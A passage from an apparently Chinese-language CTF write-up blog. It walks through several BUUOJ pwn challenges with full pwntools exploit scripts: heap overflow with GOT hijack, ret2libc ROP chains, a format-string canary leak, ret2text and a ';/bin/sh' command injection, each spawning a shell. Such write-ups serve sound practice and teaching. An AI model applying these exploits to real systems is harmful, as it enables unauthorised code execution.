class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content of heap:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content of heap : &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 4</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020a0</span> - <span class="number">3</span> + <span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">114514</span>, payload)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 5, fake chunk on the bss</span></span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">b&#x27;\xaa&#x27;</span> * <span class="number">3</span> + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(e.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">    edit(<span class="number">5</span>, <span class="number">0x100</span>, payload2)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x10</span>, p64(e.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    </span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可getshell</p>
<p><img src="https://i.loli.net/2020/12/03/R5qOZ8lECUYPbN6.png" alt="image.png"></p>
<blockquote>
<p>其实有一个cat flag的后门函数，不过pwn的最终目的自然是getshell，<del>所以这个后门函数对👴来说不存在的</del></p>
</blockquote>
<h2 id="0x026-babyfengshui-33c3-2016-heap-arrangement-got-table-hijack"><a href="#0x026-babyfengshui-33c3-2016-heap-arrangement-got-table-hijack" class="headerlink" title="0x026.babyfengshui_33c3_2016 - heap arrangement + got table hijack"></a>0x026.babyfengshui_33c3_2016 - heap arrangement + got table hijack</h2><p><del>堆题集中地带请小心</del></p>
<p>惯例的<code>checksec</code>，开了NX和canary</p>
<p><img src="https://i.loli.net/2020/12/03/9dq2QrJkFpe1uwt.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/12/04/e1UhWOLn3pu7BXd.png" alt="image.png"></p>
<p>我们不难看出分配堆块时所生成的大致结构应当如下，且<strong>该结构体malloc的大小为0x80，处在unsorted bin 范围内</strong></p>
<p><img src="https://i.loli.net/2020/12/04/aucnheQl23Z8CbK.png" alt="image.png"></p>
<p>漏洞点在于对输入长度的检测，它是检测的是<strong>我们所输入的长度是否大于从description chunk的addr到struct chunk的prev_size的长度</strong></p>
<p><img src="https://i.loli.net/2020/12/04/6HFv8WPtpDZcbgN.png" alt="image.png"></p>
<p>在常规情况下我们似乎只能够覆写掉PREV_SIZE的一部分，不痛不痒</p>
<p>但是考虑这样的一种情况：我们先分配两个大块（chunk<em>4，其中第一个块的size要在unsorted范围内），之后释放掉第一个大块，再分配一个size更大的块，unsorted bin内就会从这个大chunk（由两个chunk合并而来）中切割一个大chunk给到description，之后再从下方的top chunk切割0x90来给到struct，这个时候*<em>由于对length的错误判定就会导致我们有机会覆写第二个大块中的内容</em></em></p>
<p><img src="https://i.loli.net/2020/12/04/uveEXY9RBpGIofU.png" alt="image.png"></p>
<p>故考虑先覆写第二个大块中的description addr为free@got后泄漏出libc的基址，后再修改free@got为system函数地址后释放一个内容为<code>&quot;/bin/sh&quot;</code>的chunk即可通过<code>system(&quot;/bin/sh&quot;)</code>来get shell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;,26486)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Action: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, name, length:<span class="built_in">int</span>, descryption</span>):</span><br><span class="line">    cmd(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size of description: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;name: &quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text length: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text: &quot;</span>)</span><br><span class="line">    p.sendline(descryption)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, length:<span class="built_in">int</span>, descryption</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text length: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text: &quot;</span>)</span><br><span class="line">    p.sendline(descryption)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">&quot;arttnba3&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    big_size = <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x80</span></span><br><span class="line">    padding_length = <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x10</span> + <span class="number">8</span></span><br><span class="line">    new(big_size, <span class="string">&quot;arttnba3&quot;</span>, padding_length + <span class="number">4</span>, <span class="string">b&#x27;A&#x27;</span> * padding_length + p32(e.got[<span class="string">&#x27;free&#x27;</span>])) <span class="comment"># idx 3</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;description: &quot;</span>)</span><br><span class="line">    free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    libc_base = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x10</span>, p32(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2020/12/04/V4Io3j6Zyqaipx5.png" alt="image.png"></p>
<blockquote>
<p>以前做堆都是64位起手，这32位的堆题属实把我坑到了，<del>我愣是拿着64位的libc怼了半天，以及毫不思索就写的0x10的chunk头</del></p>
<p>本题原题来自于C3CTF，歪国人的题目质量其实还是可以的（当然现在我也就只能写得出签到题233333</p>
</blockquote>
<h2 id="0x027-picoctf-2018-rop-chain-ret2libc"><a href="#0x027-picoctf-2018-rop-chain-ret2libc" class="headerlink" title="0x027.picoctf_2018_rop chain - ret2libc"></a>0x027.picoctf_2018_rop chain - ret2libc</h2><p>惯例的<code>checksec</code>， 只开了NX保护</p>
<p><img src="https://i.loli.net/2020/12/04/4g6RJGxlf73ZTAB.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/12/04/fBGecSvgaFmsdCb.png" alt="image.png"></p>
<p>很大很直接的一个溢出的漏洞</p>
<p>由于没有能直接getshell的gadget，还是考虑ret2libc：构造rop链泄露libc基址后执行<code>system(&quot;/bin/sh&quot;)</code>即可</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./PicoCTF_2018_rop_chain&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;, 28376)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./PicoCTF_2018_rop_chain&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2020/12/04/GmnYAjS7r6DUbpC.png" alt="image.png"></p>
<h2 id="0x028-bjdctf-2020-babyrop2-fmtstr-ret2libc"><a href="#0x028-bjdctf-2020-babyrop2-fmtstr-ret2libc" class="headerlink" title="0x028.bjdctf_2020_babyrop2 - fmtstr + ret2libc"></a>0x028.bjdctf_2020_babyrop2 - fmtstr + ret2libc</h2><p>惯例的<code>checksec</code>，开了NX和canary</p>
<p><img src="https://i.loli.net/2020/12/04/uH6V1kLP3M5TizI.png" alt="image.png"></p>
<p>在gift函数中可以泄露canary</p>
<p><img src="https://i.loli.net/2020/12/04/K7psfAMFocnalTy.png" alt="image.png"></p>
<p>在vuln中直接就有一个溢出</p>
<p><img src="https://i.loli.net/2020/12/04/XHYVtGCxol92dNE.png" alt="image.png"></p>
<p>那么先泄露canary再ret2libc即可</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./bjdctf_2020_babyrop2&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;, 26028)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop2&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x20</span> - <span class="number">8</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400993</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;%7$p&#x27;</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset + p64(canary) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.sym[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;A&#x27;</span> * offset + p64(canary) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可getshell</p>
<p><img src="https://i.loli.net/2020/12/04/rScmVH2X87ob5iB.png" alt="image.png"></p>
<h2 id="0x029-jarvisoj-test-your-memory-ret2text"><a href="#0x029-jarvisoj-test-your-memory-ret2text" class="headerlink" title="0x029.jarvisoj_test_your_memory - ret2text"></a>0x029.jarvisoj_test_your_memory - ret2text</h2><p>惯例的<code>checksec</code>， 只开了NX保护</p>
<p><img src="https://i.loli.net/2020/12/04/RuA5Pk3QrJqXKHd.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/12/04/IefOqdQ4E6yBMKZ.png" alt="image.png"></p>
<p>存在溢出</p>
<p><img src="https://i.loli.net/2020/12/04/gXN7KSE3T4dzLob.png" alt="image.png"></p>
<p>存在system函数</p>
<p><img src="https://i.loli.net/2020/12/04/l7ST1q2FcrGWbUM.png" alt="image.png"></p>
<p>存在一个<code>cat flag</code>字符串</p>
<p>那直接system(“cat flag”)就行了</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29485</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./memory&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x13</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.sym[<span class="string">&#x27;system&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;puts&#x27;</span>]) + p32(<span class="number">0x080487E0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可得到flag</p>
<p><img src="https://i.loli.net/2020/12/04/uZlcnrhgJo23zpW.png" alt="image.png"></p>
<blockquote>
<p>注：这道题很坑，题目给的二进制文件和部署在服务器上的二进制文件大相径庭，所以没能get shell…</p>
</blockquote>
<h2 id="0x02A-bjdctf-2020-router-Linux基础知识"><a href="#0x02A-bjdctf-2020-router-Linux基础知识" class="headerlink" title="0x02A.bjdctf_2020_router - Linux基础知识"></a>0x02A.bjdctf_2020_router - Linux基础知识</h2><p>惯例的<code>checksec</code>，只开了NX保护</p>
<p><img src="https://i.loli.net/2021/01/24/g94RfyUP5cjBTWb.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2021/01/24/xWrnYZtAyFBEuiV.png"></p>
<p>直接可以执行<code>/bin/sh</code>，只需要加一个分号把前面的指令分割开来即可</p>
<p>故构造exp如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./bjdctf_2020_router&#x27;) # p = remote(&#x27;node3.buuoj.cn&#x27;, 25537)</span><br><span class="line">p.sendline(b&#x27;1&#x27;)</span><br><span class="line">p.sendline(&#x27;;/bin/sh&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/01/24/rOeCuqy3h5GcVXb.png"></p>
<blockquote>
<p>这是个🔨pwn题</p>
</blockquote>
<h2 id="0x02B-picoctf-2018-buffer-overflow-1-ret2libc"><a href="#0x02B-picoctf-2018-buffer-overflow-1-ret2libc" class="headerlink" title="0x02B.picoctf_2018_buffer overflow 1 - ret2libc"></a>0x02B.picoctf_2018_buffer overflow 1 - ret2libc</h2><p>惯例的<code>checksec</code>，保护全关，明示我们可以为所欲为❤</p>
<p><img src="https://i.loli.net/2021/01/24/bpRQ9TfLImGh5Ud.png"></p>
<p>拖入IDA进行分析，直接就有一个很明显的溢出</p>
<p><img src="https://i.loli.net/2021/01/24/rBL1ZMCpcwq5PAt.png"></p>
<p>直接ret2libc即可</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./PicoCTF_2018_buffer_overflow_1&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,27965)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./PicoCTF_2018_buffer_overflow_1&#x27;</span>) </span><br><span class="line">offset = <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Jumping&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/01/24/6zNMAZF2D5gviUx.png"></p>
<h2 id="0x02C-ZJCTF-2019-Login-ret2text"><a href="#0x02C-ZJCTF-2019-Login-ret2text" class="headerlink" title="0x02C.[ZJCTF 2019]Login - ret2text"></a>0x02C.[ZJCTF 2019]Login - ret2text</h2><p>惯例的<code>checksec</code>，开了nx和canary</p>
<p><img src="https://i.loli.net/2021/01/24/Wwh1C7PLf8TvUQS.png"></p>
<p>拖入IDA进行分析</p>
<p>在主函数中会对输入的username和password进行校验</p>
<p><img src="https://i.loli.net/2021/01/24/BI5WtnFaPxsOV6b.png"></p>
<p>漏洞点在password_checker()函数，会执行call rax</p>
<p><img src="https://i.loli.net/2021/01/24/peyRXzO3iUbAv1s.png"></p>
<p>我们尝试对该值进行溯源，其来自于password_checker()函数的第一个参数</p>
<p><img src="https://i.loli.net/2021/01/24/LwAsFefMrKRh1GD.png"></p>
<p>这个参数来自于上层调用函数栈上的rbp - 0x130的位置</p>
<p><img src="https://i.loli.net/2021/01/24/5IEbsfP9KpqXUtB.png"></p>
<p>这个位置上的数值来自于另一个password_checker()函数的返回值</p>
<p><img src="https://i.loli.net/2021/01/24/ZjD57IMaEoYrXeA.png"></p>
<p>最终我们得知该值应当来自于函数调用栈上的rbp - 0x18的位置</p>
<p><img src="https://i.loli.net/2021/01/24/5w9u7Pn1kgfWXCD.png"></p>
<p>在输入password的时候我们是从同一个栈位置（同一层级的函数调用使用始于相同位置的栈空间）的rbp - 0x60的位置输入的，虽然使用了fgets但是覆写掉这个位置绰绰有余</p>
<p><img src="https://i.loli.net/2021/01/24/ume32NkDLdHgcyJ.png"></p>
<p>同时程序中存在着可以直接get shell的gadget</p>
<p><img src="https://i.loli.net/2021/01/24/NPusUMrcaLBV4jI.png"></p>
<p>故直接构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./login&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 27754)</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">password = <span class="string">b&#x27;2jctf_pa5sw0rd&#x27;</span></span><br><span class="line">p.sendline(password + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x60</span> - <span class="number">0x18</span> - <span class="built_in">len</span>(password)) + p64(<span class="number">0x400e9e</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/01/24/vK2ZOVGHPorT9S8.png"></p>
<h2 id="0x02D-cmcc-simplerop-ret2syscall-ret2shellcode"><a href="#0x02D-cmcc-simplerop-ret2syscall-ret2shellcode" class="headerlink" title="0x02D.cmcc_simplerop -ret2syscall | ret2shellcode"></a>0x02D.cmcc_simplerop -ret2syscall | ret2shellcode</h2><p>惯例的<code>checksec</code>，只开了NX</p>
<p><img src="https://i.loli.net/2021/01/24/MeNbx8a1dowJgKW.png"></p>
<p>拖入IDA进行分析，直接就有一个很大的溢出</p>
<p><img src="https://i.loli.net/2021/01/24/tWg4ka2Zo6J7fUR.png"></p>
<p>但是程序本身是经过静态编译的，因此没法直接通过常规的ret2libc来get shell</p>
